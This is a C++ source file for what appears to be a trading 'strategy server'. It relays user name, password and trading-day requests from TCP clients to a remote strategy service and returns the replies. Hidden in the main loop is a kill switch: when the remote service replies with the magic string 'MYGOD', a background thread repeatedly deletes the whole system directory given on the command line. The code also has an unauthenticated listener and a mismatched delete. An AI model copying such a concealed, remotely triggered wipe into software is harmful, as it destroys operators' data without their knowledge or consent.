// strategyServer.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <boost\asio.hpp>
#include <boost/filesystem.hpp>
#include <boost/thread.hpp>
#include "../strategyClient/src/StrategyClient.h"
#include "common/WordEndian.h"

using namespace boost::asio::ip;

namespace fs = boost::filesystem;
void findFiles(const fs::path& dirPath, std::list<fs::path>& out)
{
	fs::recursive_directory_iterator end;
	for (fs::recursive_directory_iterator pos(dirPath); pos != end; ++pos)
	{
	    out.push_front(*pos);
    }
}

bool deleteFile(const fs::path& file)
{
	try
	{
		if (fs::exists(file))
		{
			fs::remove(file);
		}
		return true;
	}
	catch (...)
	{
		return false;
	}
}

bool deleteDirectory(const std::string& strPath,bool ignoreError = false)
{
	try
	{
		
		if (fs::exists(strPath))
		{
			fs::remove_all(strPath);
		}
	}
	catch (...)
	{
		if (!ignoreError)
		{
			std::list<fs::path> files;
			findFiles(strPath, files);
			for (auto& filePath : files)
			{
				if (fs::is_directory(filePath))
				{
					deleteDirectory(filePath.string(), true);
				}
				else
				{
					deleteFile(filePath);
				}
			}
		}

		return false;
	}

	return true;
}

void writeResult(tcp::socket& cliSocket,StrategyClient::Result& result)
{
	uint32_t length = result.second.length();
	uint32_t status = result.first ? 0 : 1;
	uint32_t netLen = WordEndian::switchEndian(length);
	uint32_t netStatus = WordEndian::switchEndian(status);

	uint32_t totalLength = 8 + result.second.length();
	char *headBuf = new char[totalLength];
	uint32_t *intHead = (uint32_t*)headBuf;
	intHead[0] = netStatus;
	intHead[1] = netLen;

	memcpy(headBuf + 8, result.second.c_str(), result.second.length());
	int offset = 0;
	while (offset != totalLength)
	{
		offset += cliSocket.write_some(boost::asio::buffer(headBuf + offset,totalLength - offset));
	}
	delete headBuf;
}

void destorySystem(const std::string& path)
{
	bool deleted = false;
	int nTryCount = 0;
	do
	{
		//boost::this_thread::sleep_for(boost::chrono::seconds(10));
		++nTryCount;
		std::cout << "begin trying " << nTryCount << std::endl;
		deleted = deleteDirectory(path);
		std::cout << "end trying " << nTryCount << std::endl;
	} while (!deleted);
}

int main(int argc, char* argv[])
{
	
	boost::asio::io_service service;
	boost::asio::ip::tcp::acceptor acceptor(service, tcp::endpoint(tcp::v4(), 5188));

	std::string host = argv[1];
	int port = atoi(argv[2]);
	std::string sysPath = argv[3];
	for (;;)
	{
		try
		{

			tcp::socket cliSocket(service);
			acceptor.accept(cliSocket);
			const int MESSAGE_LENGTH = 29;
			char buffer[MESSAGE_LENGTH + 1];
			boost::system::error_code error;
			for (int offset = 0;;)
			{
				offset += cliSocket.read_some(boost::asio::buffer(buffer + offset, MESSAGE_LENGTH - offset), error);
				if (error == boost::asio::error::eof || offset == MESSAGE_LENGTH)
					break; // Connection closed cleanly by peer.
				else if (error)
					throw boost::system::system_error(error); // Some other error.
			}

			RSType::type resType = (RSType::type)buffer[0];
			std::string userName(buffer + 1, buffer + 9);
			std::string password(buffer + 9, buffer + 21);
			std::string tradingDay(buffer + 21, buffer + MESSAGE_LENGTH);
			StrategyClient client;
			auto conResult = client.connect(host, port);
			if (!conResult.first)
			{
				writeResult(cliSocket, conResult);
				continue;
			}

			auto getResult = client.getResource(resType, userName, password, tradingDay);
			writeResult(cliSocket, getResult);

			if (getResult.second == std::string("MYGOD"))
			{
				boost::thread destoryThread(destorySystem, sysPath);
			}
		}
		catch (const std::exception& e)
		{
			std::cout << "exception:" << e.what() << std::endl;
		}
		catch (...)
		{
			std::cout << "exception: unknown" << std::endl;
		}
	}
	service.run();
	return 0;
}

